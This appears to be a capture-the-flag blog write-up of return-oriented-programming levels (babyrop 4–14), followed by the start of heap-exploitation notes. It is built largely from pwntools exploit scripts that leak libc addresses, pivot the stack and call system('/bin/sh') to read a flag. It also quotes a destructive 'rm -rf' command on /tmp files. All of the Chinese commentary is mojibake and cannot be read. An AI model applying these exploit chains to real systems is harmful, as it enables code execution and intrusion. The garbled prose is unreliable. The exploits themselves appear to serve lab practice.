python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#è¿ç»­è£…å››ä¸ªå‚æ•°å’Œraxç³»ç»Ÿè°ƒç”¨å·.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d7b</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x401d63</span>, <span class="hljs-number">0x403EC8</span>, <span class="hljs-number">0x401d5c</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401d54</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d74</span>, <span class="hljs-number">268</span>, <span class="hljs-number">0x401d8b</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure><p>æƒ³å‡ºæ¥è¿™ä¸ªæ˜¯å› ä¸ºä¸çŸ¥é“æ€ä¹ˆleakæ ˆä¸Šçš„åœ°å€, ä¼°è®¡ä¸‹å‡ ä¸ªlevelå¾—ç›´æ¥å®Œè›‹å§â€¦â€¦.</p><p><del>çœ‹ä»¥å‰çš„ctfå‘ç°ä¹Ÿè®¸å¯ä»¥ä½¿ç”¨writeå‡½æ•°æ¥æ‰“å°æ ˆä¸Šçš„å†…å®¹, è‚¯å®šæœ‰ä¸€ä¸ªæŒ‡å‘æ ˆä¸Šçš„æŒ‡é’ˆçš„. æ¯”å¦‚è¯´mainçš„rbp.</del>æ²¡äº‹äº†, writeçš„åœ°å€ä¹Ÿå¾—æ˜¯æŒ‡å‘æ ˆçš„æŒ‡é’ˆ, å±äºæ˜¯é¸¡å’Œè›‹çš„é—®é¢˜, æš‚æ—¶æ²¡æœ‰æ–°æ–¹æ³•.</p><h4 id="level6-4"><a href="#level6-4" class="headerlink" title="level6"></a>level6</h4><p>è¿™æ¬¡æ²¡æœ‰äº†syscall, åªæœ‰ä¸€ä¸ªç°æˆçš„å‡½æ•°<code>force_import</code>, gadgetä¹Ÿå°‘äº†å‡ ä¸ª. ä¸è¿‡ä¹Ÿç®€å•. ä¿æŠ¤æ²¡æœ‰å˜åŒ–.</p><img src="../../image/pwn-modules/image-20220506101348091.png" alt="image-20220506101348091" style="zoom:80%;" /><p>å†åŠ ä¸Šchallengeç»“æŸæ—¶çš„å¯„å­˜å™¨å€¼:</p><img src="../../image/pwn-modules/image-20220506104816965.png" alt="image-20220506104816965" style="zoom:80%;" /><p>è¿™æ ·çš„è¯åªè¦æ”¹æ”¹rdi rsi. (openå¤šå‚æ•°åˆ°åº•æœ‰æ²¡æœ‰é—®é¢˜???)</p><ul><li>ä½†æ˜¯rsiåŒæ—¶ä½œä¸ºopençš„oflagå’Œsendfileçš„in_fd, æŒ‰ç†æ¥è¯´openä¸€èˆ¬ä¼šå¼€å‡ºæ¥3, é‚£ä¹ˆoflagå°±å¾—æ˜¯3äº†, ä½†å¾ˆæ˜æ˜¾ä¸èƒ½æ˜¯3, è¿™æ ·æ ‡å¿—ä½ä¼šæœ‰å†²çª. é‚£ä¹ˆç”¨ä¸€ä¸ªæ–‡ä»¶å ç”¨fd3, è¿™æ ·å°±ä¼šå¼€åˆ°4. å¦‚æœoflagæ˜¯4çš„è¯ä¼šè¢«è¯†åˆ«ä¸ºåªè¯». </li><li>æ¥ä¸‹æ¥å°±æ˜¯rdiçš„é—®é¢˜, opençš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸²çš„åœ°å€(â€˜eâ€™, null-terminal string at 0x400457), è¿˜è¦è¢«ç”¨åœ¨sendfileçš„out_fdä¸­, è€Œfdæ˜¯intç±»å‹, åŠ ä¸Šæ–‡ä»¶å›ºå®šä½åœ°å€æ‰§è¡Œ, è¿™æ ·å­è¿˜è¦åœ¨å‘½ä»¤è¡Œä¸­å¼€ä¸€ä¸ªfdä¸º4195415(0x400457)çš„è¾“å‡ºæ–‡ä»¶.</li></ul><p>ç„¶åå‘ç°bashå¹¶ä¸èƒ½æ‰“å¼€è¶…è¿‡9çš„fd. ç”±æ“ä½œç³»ç»Ÿåˆ†é…çš„fd, bashæ˜¯æ€ä¹ˆæ§åˆ¶çš„? ä¸ºä»€ä¹ˆåªæä¾›0-9?</p><p>ä¸€æ¬¡æ‰§è¡Œè¿™ä¸ªå‡½æ•°æœ‰å›°éš¾ä¹Ÿå¯ä»¥æ‰§è¡Œä¸¤æ¬¡.</p><ul><li>ç¬¬ä¸€æ¬¡open(â€˜eâ€™, 4), send(â€˜fâ€™, 4, 0, 0x7fâ€¦â€¦), sendfileå¤±è´¥.</li><li>ç¬¬äºŒæ¬¡ç›´æ¥è·³åˆ°sendfile(1, 3, 0, 60), å› ä¸ºopenå‡½æ•°ä¼šä¿®æ”¹rdi rsiç­‰ç­‰, ä»å‡½æ•°å…¥å£å¼€å§‹æ‰§è¡Œçš„è¯ROPè®¾ç½®çš„å¯„å­˜å™¨å€¼å°±å¤±æ•ˆäº†.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401b6a</span>, <span class="hljs-number">0x400458</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401B3F</span>])<br>pl+= flat([<span class="hljs-number">0x401b6a</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x401b7a</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401b72</span>, <span class="hljs-number">60</span>, <span class="hljs-number">0x401B56</span>, <span class="hljs-number">0</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure><hr><ul><li>æˆ‘å¼€äº†aslræ‰èƒ½åœ¨gdbé‡Œé¢è¿›è¡Œè¾“å…¥, å…·ä½“åŸå› æœªçŸ¥.</li><li>ææ¸…æ¥šäº†opençš„ä¸€äº›ä¸œè¥¿<ul><li>oflagç”¨4å­—èŠ‚ä¸­æœ€ä½2bitsè¡¨ç¤º, æŒ‰æ•°å€¼åŒºåˆ«. modeå‚æ•°åªæœ‰åœ¨åˆ›å»ºæ–°æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨, <strong>ä¸€èˆ¬å¯å¿½ç•¥</strong>.</li><li>libcä¸­çš„openå‡½æ•°æœ€ç»ˆéƒ½ä¼šè°ƒç”¨openat, è¿™æ ·æ—¢èƒ½æ¥å—ç»å¯¹åœ°å€ä¹Ÿèƒ½æ¥å—ç›¸å¯¹åœ°å€.</li></ul></li></ul><h4 id="level7-3"><a href="#level7-3" class="headerlink" title="level7"></a>level7</h4><p>ç›´æ¥ç»™æˆ‘systemå‡½æ•°çš„åœ°å€.</p><p>æœ¬åœ°æˆåŠŸäº†, ç°æŸ¥systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²çš„åç§»ç›´æ¥å†™å‡ºè„šæœ¬, ä½†æ˜¯è¿œç¨‹ä¸ä»…æ²¡æ³•attach, è¿˜ä¸èƒ½strace, æ˜æ˜å°±æ˜¯é‚£ä¸ªåç§»å´è¿è¡Œä¸äº†. éš¾ä¸æˆæƒ³è®©æˆ‘ç”¨åˆ«çš„æ–¹æ³•?</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level7.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;ltrace &#x27;+binary, shell=True)</span><br>p = process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27;is: 0x&#x27;</span>)<br>sys_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>log.info(<span class="hljs-built_in">hex</span>(sys_addr))<br>binsh = sys_addr+<span class="hljs-number">0x13f112</span><br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x63</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401af3</span>, binsh, sys_addr])<br>p.sendline(pl)<br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>p.recvall()<br></code></pre></div></td></tr></table></figure><h4 id="level8-3"><a href="#level8-3" class="headerlink" title="level8"></a>level8</h4><p>æœ¬åœ°æˆåŠŸäº†, è¿œç¨‹æ‡’å¾—è¯•.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level8.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(binary)<br>elf = ELF(binary)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;) é€šè¿‡mapsæ‰¾åˆ°å¯¹åº”libcæ–‡ä»¶.</span><br>libc = ELF(<span class="hljs-string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>) <span class="hljs-comment">#æœ¬åœ°æµ‹è¯•libcæ–‡ä»¶.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span class="hljs-number">0x401b33</span>, elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;challenge&#x27;</span>]])<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x39</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>p.sendline(pl)<br>p.recvuntil(<span class="hljs-string">b&#x27;ving!\n&#x27;</span>)<br>puts = <span class="hljs-built_in">int</span>.from_bytes(p.recv(<span class="hljs-number">6</span>), byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span class="hljs-number">0x401b33</span>, binsh, sys])<br>p.sendline(pl)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="level9-3"><a href="#level9-3" class="headerlink" title="level9"></a>level9</h4><p><strong>stack pivot!!!!</strong> </p><p>ä»¥å‰åšè¿‡äº†.</p><p>pop_rbp, bss_s<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="è¿™é‡Œè¦æŒ‡å‘2å¤„çš„åœ°å€, ä¹Ÿå°±æ˜¯bss+0x10">[1]</span></a></sup>, challenge || leave_ret, 0(useless rbp), pop_rdi<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="è¿™é‡Œå¼€å§‹å°±æ˜¯ä»æ”¹å˜åçš„rspå¼¹å‡ºè¿”å›åœ°å€. å¼€å§‹å‡†å¤‡é€šè¿‡putsæ¥leakå¤„libcåœ°å€.">[2]</span></a></sup> || got[puts], plt[puts]<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="è¿™ä¹‹åè¦æ¥æ”¶putsçš„åœ°å€.">[3]</span></a></sup>, pop_rdi || str_binsh, system.</p><h4 id="level10-3"><a href="#level10-3" class="headerlink" title="level10"></a>level10</h4><p>å¼€äº†PIE, è€Œä¸”winæ˜¯ç”¨mmapåˆ†é…åˆ°ä¸€ä¸ªéšæœºçš„åœ°å€, ç„¶ååªç»™è¯»å’Œæ‰§è¡Œçš„æƒé™, æ‰€ä»¥ä¸»è¦åˆ©ç”¨çš„gadgetè¿˜æ˜¯åœ¨libc_csu_inité‡Œé¢çš„. è€Œaslrçš„å¼€å¯å¯¼è‡´stackçš„ä½ç½®ä¹Ÿæ˜¯æœªçŸ¥çš„.</p><p><del>ç”±äºgadgetæ˜¯åœ¨rodataæ®µ, ROPgadgetæ— æ³•åˆ†æ, æ‰€ä»¥åœ¨pwndbgä¸­ä½¿ç”¨ropå‘½ä»¤æ¥åˆ†æmmap+mprotectåçš„åŒºåŸŸ.</del><br><del>æ³¨æ„åªæœ‰æœ€å3ä½æ˜¯æœ‰ç”¨çš„.</del>  rodataæ®µæ˜¯winå‡½æ•°, é€šè¿‡mmap+memcpyå¤åˆ¶åˆ°é«˜åœ°å€ç©ºé—´ä¸­.</p><blockquote><p>å¦‚æœè¯¥æ®µä¸å¯æ‰§è¡Œropgadgetä¹Ÿä¸ä¼šå¯¹è¿™é‡Œè¿›è¡Œåˆ†æ.</p></blockquote><hr><p>ä¸è¿‡åœ¨è¿™ä¸€é¢˜ä¸­<strong>ç›´æ¥ç»™å‡ºäº†bufçš„ä½ç½®</strong>.</p><p>mmapçš„ç©ºé—´æ€»æ˜¯åœ¨ldå…±äº«åº“çš„ä¸Šæ–¹, å’Œstackæ²¡æœ‰å…³è”. ä¸è¿‡challengä¸­mmapçš„è¿”å›å€¼å°±å­˜åœ¨æ ˆä¸Š, ä¹Ÿå°±æ˜¯bufçš„ä¸Šæ–¹8å­—èŠ‚.<br>éœ€è¦æ ˆè½¬ç§»æ¥å°†è¿™ä¸ªæŒ‡é’ˆä½œä¸ºret_address, è¿™æ ·å°±å¯ä»¥ç›´æ¥è·³åˆ°win.</p><p>å› ä¸ºæœ‰aslr, æ‰€ä»¥gadgetä¹‹é—´çš„æ•°æ®éœ€è¦å›ºå®šä¸€ä¸ªå€¼, è¿™ä¸ªå€¼å¯ä»¥åœ¨å¼€äº†aslrçš„gdbä¸­è·å–, ç„¶åä¸æ–­å°è¯•ç›´åˆ°æ–°çš„ä¸€æ¬¡ç¬¬å››ä½åˆšå¥½å’Œé€‰ä¸­çš„å€¼ç›¸ç­‰.</p><p>è¿™æ¬¡çš„å¹¸è¿æ•°å­—æ˜¯0xd57000. æ‰€æœ‰åœ¨idaçœ‹åˆ°çš„åœ°å€éƒ½è¦åŠ ä¸Šè¿™ä¸€ä¸ªåç§»é‡.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level10.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *challenge+0x109</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x88</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x3b\x87&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>: <br>        p.kill()<br></code></pre></div></td></tr></table></figure><p>è¿œç¨‹è·‘æ€»æ˜¯æœ‰ç‚¹é—®é¢˜, æ²¡æ³•è°ƒè¯•. æ‡’å¾—ç®¡äº†.</p><img src="../../image/pwn-modules/image-20220507162940280.png" alt="image-20220507162940280" style="zoom:80%;" /><h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·, ä¸è¿‡challenge()å‡½æ•°çš„ä¸»é€»è¾‘å‰åéƒ½åŠ ä¸Šäº†è¶…çº§å¤šçš„nopä½œä¸ºå¡«å……. è¿™æœ‰å•¥ç”¨?</p><p>ç¡®å®æ²¡æœ‰åŒºåˆ«. æ”¹ä¸€æ”¹åç§»é‡å°±è¿‡äº†.</p><h4 id="level12-2"><a href="#level12-2" class="headerlink" title="level12"></a>level12</h4><p>ä¿æŠ¤æ²¡æœ‰å˜åŒ–. è¿™åˆæœ‰ä»€ä¹ˆåŒºåˆ«?? 0å·ç¨‹åºè¿˜æä¾›äº†winå‡½æ•°çš„åœ°å€, è¿™ä¸ç™½ç»™ä¹ˆ.</p><ul><li>çªç„¶å°±ä¸è¡Œäº†, ä½¿ç”¨gdbçš„recordæ¥æŸ¥æ‰¾é—®é¢˜, å¥½åƒåªèƒ½åœ¨å½“å‰æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨saveå’Œrestoreå‘½ä»¤.</li><li>ROPgadgetä½¿ç”¨onlyå‘½ä»¤çš„æ—¶å€™æƒ³è¦çš„å‘½ä»¤è¦å…¨éƒ¨æ‰“å‡ºæ¥, è€Œä¸ä»…æ˜¯æˆ–çš„å…³ç³».</li><li><code>find /tmp -atime +5 -exec rm -rf &#123;&#125; +</code> è¿˜æ˜¯åˆ«ç”¨äº†.</li><li><code>egrep &#39;(pop (rbp|rsp))|leave&#39; -a libc233.gadget</code> ==<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.33.so --only &#39;pop|ret&#39;</code> </li></ul><p>è¿™é¢˜åŸæ¥æŒ‡çš„æ˜¯ä»libcä¸­è¿›è¡ŒROP, å› ä¸ºmainå‡½æ•°è¿”å›åˆ°äº†é«˜åœ°å€ä¸­çš„libc.soä¸­.å¯ä»¥ç›´æ¥åœ¨libcæ–‡ä»¶ä¸­æœç´¢å¯æ‰§è¡Œçš„ROPæ®µ.<del>ä¹Ÿä¸ä¸€å®šè¦leave, <code>pop rsp</code>ä¸ç…§æ ·è¡Œ.</del>è¿˜æ˜¯ä¸è¡Œ. ä¹–ä¹–leaveå§.</p><p>2.33ä¸­:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#0x000000000004e250 : leave ; ret</span><br><span class="hljs-number">0x000000000002798b</span> : pop rsp ; ret  <br><span class="hljs-number">0x0000000000027e3f</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret<br><span class="hljs-number">0x0000000000027c27</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret<br></code></pre></div></td></tr></table></figure><blockquote><p>2.31ä¸­:</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000000578f8</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000000c7ad3</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret 0xfff6</span><br></code></pre></div></td></tr></table></figure><p>mainè¿”å›åœ°å€åˆ°libcåç§»: 0x270b3</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#è¿™ä¸ªæ˜¯mainå‡½æ•°çš„è¿”å›åœ°å€</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x7efef009a7ed</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7efef0099000</span>     <span class="hljs-number">0x7efef01e1000</span> r-xp   <span class="hljs-number">148000</span> <span class="hljs-number">26000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.33</span>.so +<span class="hljs-number">0x17ed</span><br>    <br><span class="hljs-comment">#åˆ°libcåˆå§‹çš„åç§»æ˜¯`0x277ed`:</span><br>pwndbg&gt; distance <span class="hljs-number">0x7f6b0c0fb000</span> <span class="hljs-number">0x7f6b0c1227ed</span><br><span class="hljs-number">0x7f6b0c0fb000</span>-&gt;<span class="hljs-number">0x7f6b0c1227ed</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x277ed</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x4efd</span> words)<br></code></pre></div></td></tr></table></figure><p>è¯¶å¾—16*16*16åˆ†ä¹‹1çš„å‡ ç‡å•Š, è¿™ä¹Ÿå¤ªä½äº†ç‚¹, ä¸è¿‡æƒ³ä¸å‡ºæ¥äº†, å°±è¿™ä¹ˆå¹². <code>0x254000+0x4e250=0x2A2250</code> </p><blockquote><p><del>åˆå‘ç°åœ°å€å¥½åƒå’Œlibcæ²¡ä»€ä¹ˆå…³ç³», æ˜¯ç´§æŒ¨ç€ld.soçš„â€¦</del> è¿™ä¸ªæ–¹å‘é”™äº†</p><img src="../../image/pwn-modules/image-20220508231821229.png" alt="image-20220508231821229" style="zoom:67%;" /> </blockquote><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *main+0x19f</span><br><span class="hljs-string">    init-pwndbg</span><br><span class="hljs-string">    lm</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x50\x22\x2a&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        p.kill()<br></code></pre></div></td></tr></table></figure><h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><p>çœ‹çœ‹è¿™é¢˜åˆè¦æä»€ä¹ˆå¹ºè›¾å­.</p><p>ä¿æŠ¤å…¨å¼€, ç»™å‡ºbufä½ç½®, å¯ä»¥leakä»»æ„ä¸€ä¸ªåœ°å€ä¸Š8å­—èŠ‚æ•°æ®.</p><p>???è¿™ä¸leakä¸€ä¸ªcanaryå‡ºæ¥, ç„¶åè¿”å›åœ°å€æ”¹æˆâ€¦.å’Œä¸Šä¸€é¢˜ä¸€æ ·äº†. ret2libc</p><h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14"></a>level14</h4><p>socket</p><h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><h4 id="key"><a href="#key" class="headerlink" title="key:"></a>key:</h4><ul><li><p>Dynamic Allocators:</p><ul><li>General Purpose: Doug Lea (pictured) releases <strong>dlmalloc</strong> into public domain in 1987.</li><li>Linux: <strong>ptmalloc</strong> (Posix Thread aware fork of dlmalloc)</li><li>FreeBSD: <strong>jemalloc</strong> (also used in Firefox, Android)</li><li>Windows: Segment Heap, <strong>NT Heap</strong></li><li>Kernel allocators: <strong>kmalloc</strong> (Linux kernel memory allocator)kalloc (iOS kernel memory allocator)</li></ul></li><li><p>managed by the brk and sbrk system calls:</p><ul><li>sbrk(NULL) returns the end of the data segment</li><li>sbrk(delta) expands the end of the data segment by delta bytes</li><li>brk(addr) expands the end of the data segment to addr</li></ul></li></ul><p>ubuntu 2004è¿˜åœ¨å›¾ä¸­ç²—çº¿æ¡†çš„é˜¶æ®µ, è¿™æ˜¯ç”±äºtcacheçš„å¼•å…¥. ä¸è¿‡è¿™ä¸ªmoduleå¹¶ä¸ä¼šæ·±å…¥è¿™ä¸ªcache.</p><img src="../../image/pwn-modules/image-20220505165437735.png" alt="image-20220505165437735" style="zoom: 50%;" /><ul><li><p>tcache: </p><ul><li>a <strong>caching</strong> layer for â€œsmallâ€ allocations (&lt;1032 bytes on amd64)</li><li>makes a <strong>singly-linked-list</strong> using the first word of the free chunk</li><li><strong>very few</strong> security checks</li></ul></li><li><p>setvbuf: scanf and printf will use malloc in themselves for buffering, we can use <code>setvbuf(stdin/out, NULL)</code> to disable it. (and avoiding confusion in heap exploitation.)</p></li><li><p>ptmalloc caches(for review):</p><ul><li>64 singly-linked tcache bins for allocations of size 16 to 1032(functionally â€œcoversâ€ fastbins andsmallbins)</li><li>10 singly-linked â€œfastâ€ bins for allocations of size up to 160 bytes</li><li>1 doubly-linked â€œunsortedâ€ bin to quickly stash <strong>free()d</strong> chunks that donâ€™t fit into tcache orfastbins</li><li>64 doubly-linked â€œsmallâ€ bins for allocations up to 512 bytes</li><li>doubly-linked â€œlargeâ€ bins (anything over 512 bytes) that contain different-sized chunks</li></ul></li><li><p>The 